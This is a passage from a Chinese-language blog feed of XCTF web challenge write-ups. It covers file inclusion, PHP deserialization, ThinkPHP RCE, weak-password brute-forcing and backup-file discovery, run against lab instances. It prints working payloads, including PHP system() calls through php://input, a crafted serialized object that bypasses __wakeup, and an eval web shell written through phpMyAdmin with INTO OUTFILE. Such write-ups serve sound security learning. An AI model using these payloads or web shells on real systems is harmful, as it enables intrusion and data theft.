        <content type="html"><![CDATA[<h2 id="Web-php-include-考察文件包含"><a href="#Web-php-include-考察文件包含" class="headerlink" title="Web_php_include(考察文件包含)"></a>Web_php_include(考察文件包含)</h2><p>strstr函数：strstr(字符串,你要搜索的内容,false)<br>#字符串：也就是代码中的<code>$page</code>。例如：在url后面添加 /?page=123456，那么<code>$page</code>的内容就是123456。</p><p>#你要搜索的内容：也就是题目中的php://。意思就是该函数会从$page的内容里去寻找php://，而这里是一个while语句，一旦查找到php://，那么就会执行大括号里面的语句。</p><p>#false：该参数默认是false，也就是一般情况只需要写前两个参数即可。false代表匹配到php://之后，会输出php://和之后的内容。而如果为true，则会输出“php.”，也就是php://前面的内容。    例如URL为<br><a href="http://111.198.29.45:50769/?page=php.php://input">http://111.198.29.45:50769/?page=php.php://input</a><br>那么传入的$page的内容就是php://input，而前面的“php.”就会被丢弃。</p><p>#注：strstr函数对大小写敏感，也就是会区分大小写。</p><p>str_replace()以其他字符替换字符串中的一些字符(区分大小写)：<br>例如：str_replace(“1”，“2”，“123”)会输出223。因为会将全部的1替换为2。</p><p><img src="https://img-blog.csdnimg.cn/20201030190525283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开页面是这样一段代码，从代码中得知page中带有php://的都会被替换成空,程序过滤掉了page=参数传入php://<br>strstr() 查找字符串首次出现的位置。返回字符串剩余部分</p><p>解法一（大小写绕过）：<br>（1）由于strstr()这个函数是区分大小写的，所以可以用PHP://来代替。即<a href="http://220.249.52.133:45015/?page=PHP://input">http://220.249.52.133:45015/?page=PHP://input</a><br><img src="https://img-blog.csdnimg.cn/20201030190758224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）首先使用手动代理配置，打开burp工具，配置拦截请求，刷新网页后，进行burp抓包<br><img src="https://img-blog.csdnimg.cn/20201030190840259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030190850501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）post传参<?php system("ls");?>，在burp中点击废包查看<br><img src="https://img-blog.csdnimg.cn/20201030190925996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030190938284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发送到Repeater，在重发器中点击发送，可看到fl4gisisish3r3.php<br><img src="https://img-blog.csdnimg.cn/20201030191123792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201030191014504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）继续post传参<?php system("cat fl4gisisish3r3.php");?>，即可看到flag<br><img src="https://img-blog.csdnimg.cn/20201030191041787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030191102198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>（1）while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。代码中的hello是有回显的，可以命令执行然后回显到浏览器<br><img src="https://img-blog.csdnimg.cn/20201030191238482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）构造payload，默认页面为<a href="http://127.0.0.1/index.php,%E8%AE%BE%E7%BD%AE%E4%B8%BApage%E5%80%BC%EF%BC%8C%E5%8F%AF%E7%A1%AE%E4%BF%9Dwhile%E4%B8%BA%E7%9C%9F%EF%BC%8C%E8%AE%A9page%E5%8F%82%E6%95%B0%E7%94%A8http%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE127.0.0.1%E8%BF%99%E4%B8%AA%E6%9D%A1%E4%BB%B6%E8%82%AF%E5%AE%9A%E4%B8%BA%E7%9C%9F%E3%80%82">http://127.0.0.1/index.php,设置为page值，可确保while为真，让page参数用http伪协议访问127.0.0.1这个条件肯定为真。</a><br><img src="https://img-blog.csdnimg.cn/20201030191315511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）看到了三个文件，继续构造payload，查看fl4gisisish3r3.php，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030191342427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法三：<br>（1）用御剑扫描后台，会扫到phpmyadmin后台<br><img src="https://img-blog.csdnimg.cn/20201030191434792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）双击它进入登录界面，用户名输入为root，密码为空。（弱口令）进入<br><img src="https://img-blog.csdnimg.cn/20201030191457439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）进入SQL语句输入的地方，执行命令show variables like “secure_file_priv”查看secure_file_priv是否为空，为空则可以写数据，如果是null则不能写。<br><img src="https://img-blog.csdnimg.cn/20201030191525711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）进入SQL语句输入的地方，编辑一句话木马并执行select”<?php eval($_POST(shell);?> “ into outfile ‘/tmp/songrong.php’<br>其中shell为口令，可任意修改，songrong也可修改。Linux默认tmp是可写目录，所以在tmp目录下写入<br><img src="https://img-blog.csdnimg.cn/2020103019155011.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）然后打开菜刀类工具中国蚁剑，输入URL和密码连接<br><img src="https://img-blog.csdnimg.cn/20201030191609307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）连接成功后，打开文件管理，可发现flag<br><img src="https://img-blog.csdnimg.cn/20201030191713431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030191720118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_001</title>
      <link href="2020/11/15/XCTF/XCTF_Web-001/"/>
      <url>2020/11/15/XCTF/XCTF_Web-001/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p><img src="https://img-blog.csdnimg.cn/20201030180847595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180905654.png#pic_center" alt="在这里插入图片描述"><br>（1）按照提示，初始界面想到index.php，再次请求index.php后仍是1.php(被重定向了)。F12打开开发者模式查看“网络”模块，查看返回包发现确实有index.php，并且其中的location参数被设置为了1.php，同时发现flag<br><img src="https://img-blog.csdnimg.cn/20201030181023278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(2)也可以访问index.php，用Burp抓包，在响应包中发现flag<br><img src="https://img-blog.csdnimg.cn/20201030181133758.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201030181059758.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p><img src="https://img-blog.csdnimg.cn/20201030181220449.png#pic_center" alt="在这里插入图片描述"><br>（1）根据题目，熟悉robots.txt，在URL后加上/robots.txt<br><img src="https://img-blog.csdnimg.cn/20201030181244238.png#pic_center" alt="在这里插入图片描述"><br>（2）发现一个fl0g.php文件，在URL后加上fl0g.php访问，得到flag<br><img src="https://img-blog.csdnimg.cn/20201030181314103.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>（1）先是一段代码审计</p><pre><code>&lt;?php class Demo &#123;     private $file = &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file = $file;  //构造函数，对类的变量进行初始化    &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;//魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法    function __wakeup() &#123;         if ($this-&gt;file != &#39;index.php&#39;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var = base64_decode($_GET[&#39;var&#39;]); //正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式&#125;)，不区分大小写，就输出stop hacking!否则的话就进行发序列化    if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;</code></pre><p>（2）审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了<br>在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。<br>在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。</p><pre><code>&lt;?phpclass Demo &#123;private $file = &#39;index.php&#39;;//protected $file1 = &#39;index.php&#39;;public function __construct($file) &#123;    $this-&gt;file = $file;    //$this-&gt;file1 = $file1;&#125;function __destruct() &#123;    echo @highlight_file($this-&gt;file, true);&#125;function __wakeup() &#123;    if ($this-&gt;file != &#39;index.php&#39;) &#123;        //the secret is in the fl4g.php        $this-&gt;file = &#39;index.php&#39;;    &#125;&#125;&#125;$a = new Demo(&quot;fl4g.php&quot;);echo serialize($a).&quot;\n&quot;;//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;echo base64_encode(&#39;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#39;);</code></pre><p>使用代码在线工具执行,<a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a><br><img src="https://img-blog.csdnimg.cn/20201030182243753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改之后，再进行base64加密，传参就可以了<br>index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br><img src="https://img-blog.csdnimg.cn/20201030182357578.png#pic_center" alt="在这里插入图片描述"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p><img src="https://img-blog.csdnimg.cn/20201030182600616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（1）进入后发现是一个php框架，根据题目php-rce远程命令执行，在github上查一下这个版本有什么漏洞<br><img src="https://img-blog.csdnimg.cn/20201030182613799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030182621814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030182634128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现有好几个版本，由于只知道是5.0，则随便输入一个试试，这里注意只从”?s”开始复制，”?s”之前的是靶场。<br><img src="https://img-blog.csdnimg.cn/20201030182714277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到进一步提示，为5.0.2版本，回到github找到5.0.2版本的再次复制，然后访问。发现可以进行远程命令执行。<br><img src="https://img-blog.csdnimg.cn/20201030182750642.png#pic_center" alt="在这里插入图片描述"><br>（4）ls查看有没有什么提示信息，可用hackbar执行，或者直接在地址栏输入命令也可。这里注意要把原来最后一个”=”后面的东西删掉再输入命令。<br><img src="https://img-blog.csdnimg.cn/20201030182851546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）ls后没有发现有用信息，接着查找上一级目录，直到发现flag<br><img src="https://img-blog.csdnimg.cn/20201030182918127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）然后输入查看命令 cat /flag即可看到flag<br><img src="https://img-blog.csdnimg.cn/20201030182941486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）也可以无需一级一级目录的找，使用命令find / -name flag,也可找到flag，然后cat /flag 就可以看到flag了。<br><img src="https://img-blog.csdnimg.cn/2020103018301474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web练习区</title>
      <link href="2020/11/15/XCTF/XCTF_Web%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
      <url>2020/11/15/XCTF/XCTF_Web%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>这里右键无法查看网页源代码，可通过f12键或者在url地址前加上”view-source:”查看网页源代码找到flag。<br><img src="https://img-blog.csdnimg.cn/20201030160950637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p><img src="https://img-blog.csdnimg.cn/20201030164830774.png#pic_center" alt="在这里插入图片描述"><br>HTTP常用的请求方法：get，post。<br>（1）直接把请求参数拼接在URL后面，以？间隔URL和参数，若有多个参数，则以&amp;间隔参数</p><pre><code>http://220.249.52.133:55274/？a=1</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030165030814.png#pic_center" alt="在这里插入图片描述"><br>（2）post：提交post请求用插件hackbar。首先置入URL，选择POST Data，输入post请求，然后执行。<br><img src="https://img-blog.csdnimg.cn/2020103016523695.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030165306845.png#pic_center" alt="在这里插入图片描述"></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>（1）在URL后加上/robots.txt并访问，发现f1ag_1s_h3re.php<br>（2）构造payload，查看f1ag_1s_h3re.php得到flag<br><img src="https://img-blog.csdnimg.cn/20201030161138484.png#pic_center" alt="在这里插入图片描述"><br>（3）也可使用扫目录脚本dirsearch(<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>)</p><pre><code>python dirsearch.py -u http://10.10.10.175:32793/ -e *</code></pre><p><img src="https://img-blog.csdnimg.cn/20201106220705211.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201106220759963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>#使用dirsear需要在Python3环境下</p><p>#robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p><img src="https://img-blog.csdnimg.cn/202010301614129.png#pic_center" alt="在这里插入图片描述"><br>（1）常见的备份文件后缀名有：”.gif”、”.svn”、”.swp”、”~”、”.bak”、”.bash_history”、”.bkf”（共7种）<br>根据提示index.php文件进行备份，逐个尝试构造备份链接。找到.bak的备份文件<br><img src="https://img-blog.csdnimg.cn/20201030161651393.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030161701370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）下载备份文件直接打开就能够找到flag。<br>（3）也可以使用目录扫描工具dirsearch扫出index.php.bak文件，然后构造链接即可。<br><img src="https://img-blog.csdnimg.cn/20201106221347697.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201106221416497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>解法一：<br>（1）在Firefox浏览器按下F12键打开开发者工具，刷新后，在“存储”一栏，可看到名为look-here的cookie的值为cookie.php<br><img src="https://img-blog.csdnimg.cn/20201030162605217.png#pic_center" alt="在这里插入图片描述"><br>（2）构造链接访问<a href="http://220.249.52.133:38910/cookie.php%EF%BC%8C%E6%8F%90%E7%A4%BA%E6%9F%A5%E7%9C%8Bhttp%E5%93%8D%E5%BA%94%E5%8C%85%EF%BC%8C%E5%9C%A8%E2%80%9C%E7%BD%91%E7%BB%9C%E2%80%9D%E4%B8%80%E6%A0%8F%EF%BC%8C%E5%8F%AF%E7%9C%8B%E5%88%B0%E8%AE%BF%E9%97%AEcookie.php%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%9C%A8%E6%B6%88%E6%81%AF%E5%A4%B4%E5%86%85%E5%8F%AF%E5%8F%91%E7%8E%B0flag">http://220.249.52.133:38910/cookie.php，提示查看http响应包，在“网络”一栏，可看到访问cookie.php的数据包，在消息头内可发现flag</a><br><img src="https://img-blog.csdnimg.cn/20201030162715758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>（1）使用burpsuite工具扫描URL，然后查看response（响应），可看到名为look-here的cookie的值为cookie.php<br><img src="https://img-blog.csdnimg.cn/20201030162823230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）继续扫描构造的链接<a href="http://220.249.52.133:38910/cookie.php%E6%9F%A5%E7%9C%8Bresponse%E8%8E%B7%E5%8F%96flag">http://220.249.52.133:38910/cookie.php查看response获取flag</a></p><p><img src="https://img-blog.csdnimg.cn/20201030162939369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>（1）使用Firefox浏览器按F12键打开开发者工具，在查看器窗口审查元素，发现存在disabled=””字段，在按钮中使用了该属性，右键编辑HTML，将该字段删除。按钮可按，即可得到flag。<br><img src="https://img-blog.csdnimg.cn/20201030163135720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163144714.png#pic_center" alt="在这里插入图片描述"><br>（2）使用Firefox的hackbar，用post方式传递auth=flag，同样可以得到flag。</p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>（1）题目属于弱口令爆破，随便输入一个用户名和密码，提示要用admin用户登录，跳转到了check.php，在URL前加view-source:查看源代码，提示要用字典。<br><img src="https://img-blog.csdnimg.cn/20201030163454217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163504331.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163514763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）在Firefox浏览器中“选项”–&gt;”网络设置”–&gt;“手动代理配置”开启foxproxy代理服务器，打开Burpsuite工具，点击代理—拦截请求，输入123密码再登录。<br><img src="https://img-blog.csdnimg.cn/20201030163610494.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163619937.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163628572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）设置爆破点：将123作为攻击对象，具体操作：测试器–&gt;位置–&gt;选中“123”–&gt;添加<br><img src="https://img-blog.csdnimg.cn/20201030163707884.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163717546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）加载字典：点击有效载荷–载入–常用密码.txt。</p><p>字典:<a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a><br><img src="https://img-blog.csdnimg.cn/20201030163748612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）开始攻击，查看响应包列表，发现密码为123456时，响应包的长度和别的不一样<br><img src="https://img-blog.csdnimg.cn/20201030163933455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）点进去查看响应包，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030164002522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" 